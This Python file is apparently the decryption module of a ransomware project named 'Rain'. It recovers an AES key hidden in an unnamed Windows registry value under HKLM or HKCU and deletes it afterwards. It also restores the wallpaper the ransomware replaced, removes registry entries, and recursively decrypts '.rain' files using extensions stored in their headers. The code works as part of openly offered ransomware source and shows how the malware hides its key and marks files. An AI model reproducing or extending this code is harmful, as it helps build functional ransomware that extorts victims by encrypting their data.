#!/usr/bin/env python
# Rain's decryption functions
# Developed by WillRazorFace

from Crypto.Cipher import AES
from winreg import *
from shutil import copyfile
from ctypes import windll
from os import remove
from os.path import splitext
from struct import unpack, calcsize
from glob import iglob


class Decrypt:
    def __init__(self, ransom_name='Rain', out_ext='.rain', key=None, decryptor=None):
        self.ransom_name = ransom_name
        self.out_ext = out_ext
        self.key = key
        self.decryptor = decryptor
        self.get_key()

    def get_key(self):
        # Searches for the key used in encrypting files. If not found, terminates execution
        winkey = OpenKey(HKEY_LOCAL_MACHINE, '')
        try:
            binkey = QueryValueEx(winkey, ' ')[0]
            self.key = (bytes(int(binkey[i: i + 8], 2) for i in range(0, len(binkey), 8)))
            DeleteValue(winkey, ' ')
            CloseKey(winkey)
        except PermissionError:
            try:
                winkey = OpenKey(HKEY_CURRENT_USER, '')
                binkey = QueryValueEx(winkey, ' ')[0]
                self.key = (bytes(int(binkey[i: i + 8], 2) for i in range(0, len(binkey), 8)))
                DeleteValue(winkey, ' ')
                CloseKey(winkey)
            except FileNotFoundError:
                exit(1)
        except FileNotFoundError:
            try:
                winkey = OpenKey(HKEY_CURRENT_USER, '')
                binkey = QueryValueEx(winkey, ' ')[0]
                self.key = (bytes(int(binkey[i: i + 8], 2) for i in range(0, len(binkey), 8)))
                DeleteValue(winkey, ' ')
                CloseKey(winkey)
            except FileNotFoundError:
                exit(1)
        return 0

    def restore_background(self, appdata: str):
        # Restores the used background image before encryption.
        old = appdata + '/Microsoft/Windows/Themes/OldTranscodedWallpaper'
        changed = appdata + '/Microsoft/Windows/Themes/TranscodedWallpaper'
        try:
            copyfile(old, changed)
            remove(old)
        except FileNotFoundError:
            pass
        windll.user32.SystemParametersInfoW(20, 0, changed, 0)
        return 0

    def delete_registry(self, keypath: str, name: str):
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, keypath, access=KEY_ALL_ACCESS)
            DeleteValue(key, name)
            CloseKey(key)
        except PermissionError:
            try:
                key = OpenKey(HKEY_CURRENT_USER, keypath, access=KEY_ALL_ACCESS)
                DeleteValue(key, name)
                CloseKey(key)
            except FileNotFoundError:
                return 1
        except FileNotFoundError:
                try:
                    key = OpenKey(HKEY_CURRENT_USER, keypath, access=KEY_ALL_ACCESS)
                    DeleteValue(key, name)
                    CloseKey(key)
                except FileNotFoundError:
                    return 1
        return 0

    def correct_ext(self, file: str):
        """Corrects the file extension with the leading characters
        (before the ".") entered during the data encryption process."""

        cnt = 0
        chars = []

        while True:
            with open(file, 'rb') as f:
                f.seek(cnt)
                char = f.read(1)
                if char != b'.':
                    chars.append(char)
                    cnt += 1
                else:
                    f.close()
                    break

        ext = [x.decode('utf-8') for x in chars]
        ext = ''.join(ext)
        filename = splitext(file)[0] + '.' + ext

        with open(file, 'rb') as f:
            cnt += 1
            f.seek(cnt)
            filedata = f.read()

        with open(file, 'wb') as f:
            f.write(filedata)

        return filename

    def decrypt_file(self, file: str, chunksize=64*2048):
        # Decrypts a file with AES CBC mode using the key found in the system logs.
        originalpath = self.correct_ext(file)

        with open(file, 'rb') as fin:
            fsz = unpack('<Q', fin.read(calcsize('<Q')))[0]
            iv = fin.read(16)
            decryptor = AES.new(self.key, AES.MODE_CBC, iv)

            with open(originalpath, 'wb') as fout:
                while True:
                    data = fin.read(chunksize)
                    n = len(data)
                    if n == 0:
                        break
                    decd = decryptor.decrypt(data)
                    n = len(decd)
                    if fsz > n:
                        fout.write(decd)
                    else:
                        fout.write(decd[:fsz])
                    fsz -= n

        remove(file)
        return 0

    def decrypt_directory(self, dir: str):
        filetree = iglob(dir + '/**/*' + self.out_ext, recursive=True)
        for file in filetree:
            self.decrypt_file(file)
        return 0
